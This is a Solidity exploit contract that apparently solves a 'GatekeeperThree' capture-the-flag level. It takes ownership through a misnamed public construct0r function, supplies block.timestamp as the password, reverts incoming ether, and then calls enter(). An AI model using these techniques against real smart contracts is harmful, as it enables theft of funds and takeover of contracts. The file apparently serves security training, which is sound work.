pragma solidity ^0.8.0;

interface IGatekeeperThree {
    function construct0r() external;
    function createTrick() external;
    function getAllowance(uint256 _password) external;
    function enter() external;
    function trick() external view returns (address);
}


contract Attacker {
    address public immutable gatekeeper;

    constructor(address _gatekeeper) {
        gatekeeper = _gatekeeper;
    }

    function startAttack() external {
        IGatekeeperThree(gatekeeper).construct0r();
        IGatekeeperThree(gatekeeper).createTrick();
        uint256 password = block.timestamp;
        IGatekeeperThree(gatekeeper).getAllowance(password);
        IGatekeeperThree(gatekeeper).enter();
    }

    receive() external payable {
        revert();
    }
}